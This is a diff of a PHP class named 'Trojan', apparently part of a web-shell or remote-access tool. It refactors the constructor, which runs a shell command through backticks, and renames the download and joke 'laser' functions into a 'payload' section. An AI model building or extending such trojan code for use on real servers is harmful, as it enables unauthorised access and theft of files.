@@ -25,8 +25,9 @@ class Trojan{
      * A generic constructor
      */
     public function __construct(){
-        # guarantee that $this->cwd always contains a meaningful value
-        $this->cwd = trim(`pwd`);
+        # guarantee that these properties always have meaningful values
+        $this->cwd                        = trim(`pwd`);
+        $this->response['prompt_context'] = $this->get_prompt_context();
     }
 
     /**
@@ -121,12 +122,18 @@ class Trojan{
         return $this->prompt_context;
     }
 
+
+
+
+    /*************************************************************************
+     * Payload functions are from here downward
+     *************************************************************************
     /**
      * Downloads a file
      *
      * @param string $file             The file to download
      */
-    public function download($file = 'blah'){
+    public function payload_download($file = 'blah'){
 
         # assemble a response
         $this->response = array(
@@ -156,13 +163,13 @@ class Trojan{
     }
 
     # fire mah layzor
-    public function laser($args){
+    public function payload_laser($args){
         $args = join($args, "\n");
 
         # assemble a response
         $this->response = array(
             'output'         => 'Laser fired!!1' . $args,
-            'prompt_context' => 'wash.file.up',
+            'prompt_context' => $this->prompt_context,
         );
 
         $this->send_response();
